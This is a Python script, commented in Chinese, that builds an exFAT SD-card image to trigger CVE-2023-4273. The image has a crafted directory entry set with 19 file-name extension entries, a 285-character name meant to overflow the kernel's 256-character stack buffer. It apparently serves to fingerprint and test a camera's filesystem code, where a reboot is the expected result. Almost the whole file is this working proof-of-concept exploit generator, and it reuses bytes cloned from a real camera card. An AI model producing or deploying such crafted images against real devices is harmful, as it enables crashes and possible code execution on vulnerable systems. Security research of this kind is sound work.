#!/usr/bin/env python3
"""第二轮①：CVE-2023-4273 复现卡 — 超长文件名条目集（19×C1，累计名长 285 字符）

背景：CVE-2023-4273 = 上游 exFAT 5.8+ 重写引入（commit ca06197）、2023-08 披露、
      6.5-rc5 修复（d42334578eba，"check if filename entries exceeds max filename
      length"）。exfat_get_uniname_from_ext_entry() 逐 C1 拷 15 字符进栈缓冲
      uniname[MAX_NAME_LENGTH+1]=256 wchar，无累计长度检查 → 18+ 个 C1 即溢出。

第一轮指纹（d19 不走链/b16 不崩/b14·b06 校验更严/d17 位图门）→ 相机 exFAT ≈ 5.8+
重写回植 4.19。若快照早于 2023 修复 → 相机带洞：插卡开机列根目录即触发，预期 R（重启）。
本卡改动最小化：cam_seed 基础上只把 TESTFILE.BIN 条目集扩成 85+C0+19×C1（85 次项数
0x14），其余字节全部照搬 seed。名字 = "TESTFILE.BIN" + 'A'×273（285 字符，19 段×15）。
C0 的 NL/hash 保持 seed 原值（NL=12）——若相机按 NL 截断即不溢出（M），若按 5.8+
原逻辑逐 C1 累加即溢出（R）。两种结果都是有效指纹。
"""
import os, struct, hashlib

REF = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(os.path.dirname(REF), "images_cam")

PART = 32768              # 分区起始扇区（盘内）
VOL_LEN = 250531840       # 卷长扇区（克隆自相机卡）
HEAP_OFF = 32768          # 簇堆在分区内扇区偏移
FAT_OFF, FAT_LEN = 16384, 16384
SPC = 256                 # 扇区/簇
CLUS = SPC * 512          # 簇字节 = 128KB
TOTAL_SECT = PART + VOL_LEN

def ror16(x): return ((x >> 1) | ((x & 1) << 15)) & 0xFFFF
def name_hash(name):
    s = 0
    for b in name.encode('utf-16-le'):
        s = (ror16(s) + b) & 0xFFFF
    return s

def fat_dt(y, mo, d, h, mi, s):
    date = ((y - 1980) << 9) | (mo << 5) | d
    time = (h << 11) | (mi << 5) | (s // 2)
    return struct.pack('<I', (date << 16) | time)

def entry85(x, dt, sec):
    """85 主项：85 <次项数> X(4B) 00×6 dt×3 6464 00×6（seed 的次项数=2 → 本卡=20）"""
    return (b'\x85' + bytes([sec]) + struct.pack('<I', x) + b'\x00' * 6
            + dt + dt + dt + b'\x64\x64' + b'\x00' * 6)

def entry_c0(nl, hsh, vdl, fc, dl, flags=0x01):
    return (b'\xc0' + bytes([flags, 0x00, nl]) + struct.pack('<H', hsh)
            + b'\x00\x00' + struct.pack('<Q', vdl) + b'\x00' * 4
            + struct.pack('<I', fc) + struct.pack('<Q', dl))

def entry_c1(name):
    return b'\xc1\x00' + name.encode('utf-16-le') + b'\x00' * (30 - 2 * len(name))

# ---------- 读取相机真机字节 ----------
head = open(os.path.join(REF, "camera_head_4m.bin"), 'rb').read()
part = open(os.path.join(REF, "camera_part16m.bin"), 'rb').read()
heap = open(os.path.join(REF, "camera_heap1m.bin"), 'rb').read()
assert part[:11] == b'\xeb\x76\x90EXFAT   ', "camera_part16m.bin 不对"
root_cam = heap[256 * 1024:384 * 1024]
upcase = heap[128 * 1024:256 * 1024]
dcim_cam = heap[393216:524288]
priv_cam = heap[524288:655360]

TEST = (b"S1M2-CAM-TEMPLATE-TESTFILE " * 1792).ljust(65536, b'#')

# ---------- 组装根目录：seed 原样 + TESTFILE 条目集扩成 85+C0+19×C1 ----------
N_C1 = 19
LONG = "TESTFILE.BIN" + "A" * (15 * N_C1 - len("TESTFILE.BIN"))   # 285 字符
assert len(LONG) == 15 * N_C1 == 285
dt = fat_dt(2026, 10, 11, 16, 35, 34)
root = bytearray(root_cam[:288])                  # 相机亲笔 83/81/82 + DCIM集 + PRIVATE集
root += entry85(0x00204DCD, dt, sec=1 + N_C1)     # 次项数 = C0 + 19×C1 = 20
root += entry_c0(12, name_hash("TESTFILE.BIN"), len(TEST), 10, len(TEST))
for i in range(N_C1):
    root += entry_c1(LONG[15 * i:15 * (i + 1)])
assert len(root) == 288 + 32 * (2 + N_C1), len(root)

# ---------- 位图 / FAT：与 seed 完全一致 ----------
alloc = set(range(2, 11)) | {41}
bitmap = bytearray(CLUS)
for c in alloc:
    bitmap[(c - 2) // 8] |= 1 << ((c - 2) % 8)
fat = bytearray(FAT_LEN * 512)
struct.pack_into('<I', fat, 0, 0x0FFFFFF8)
for c in list(range(1, 11)) + [41]:
    struct.pack_into('<I', fat, c * 4, 0xFFFFFFFF)

p = bytearray()
def put(data, sector):
    global p
    off = sector * 512
    if len(p) < off + len(data):
        p += b'\x00' * (off + len(data) - len(p))
    p[off:off + len(data)] = data

put(part[:24 * 512], 0)
put(bytes(fat), FAT_OFF)
put(bytes(bitmap), HEAP_OFF + (2 - 2) * SPC)
put(upcase, HEAP_OFF + (3 - 2) * SPC)
put(bytes(root), HEAP_OFF + (4 - 2) * SPC)
put(dcim_cam, HEAP_OFF + (5 - 2) * SPC)
put(priv_cam, HEAP_OFF + (6 - 2) * SPC)
put(TEST, HEAP_OFF + (10 - 2) * SPC)

name = "cam_cve4273_longname_19c1.img"
path = os.path.join(OUT, name)
with open(path, 'wb') as f:
    f.write(head[:512])
    f.seek(PART * 512)
    f.write(bytes(p))
    f.seek(TOTAL_SECT * 512 - 1)
    f.write(b'\x00')
print(f"{name}  written  ({os.path.getsize(path)} 字节稀疏)")

# ---------- 自检：回读根目录条目集 ----------
root_off = HEAP_OFF * 512 + (4 - 2) * SPC * 512
with open(path, 'rb') as f:
    f.seek(PART * 512 + root_off)
    r = f.read(288 + 32 * (2 + N_C1))
assert r[0:288] == root_cam[:288], "前 288 字节应与 seed 一致"
assert r[288] == 0x85 and r[289] == 1 + N_C1, f"85 次项数错: {r[289]}"
assert r[320] == 0xC0, "C0 位置错"
types = [r[288 + 32 * i] for i in range(2 + N_C1)]
name_bytes = b''.join(bytes(r[288 + 32 * (2 + i) + 2:288 + 32 * (3 + i)]) for i in range(N_C1))
assert name_bytes == LONG.encode('utf-16-le'), "名字回读不一致"
print(f"自检 OK: 85@288(sec={r[289]}) + C0@320 + C1×{N_C1}@352..，累计名长 {len(LONG)} 字符")
assert root_off + len(r) < 40 << 20, "根目录必须在前 40MB 刷写区内"

h = hashlib.sha256()
with open(path, 'rb') as f:
    while f.tell() < (40 << 20):
        h.update(f.read(1 << 20))
print(f"sha256(前40MB) = {h.hexdigest()}")
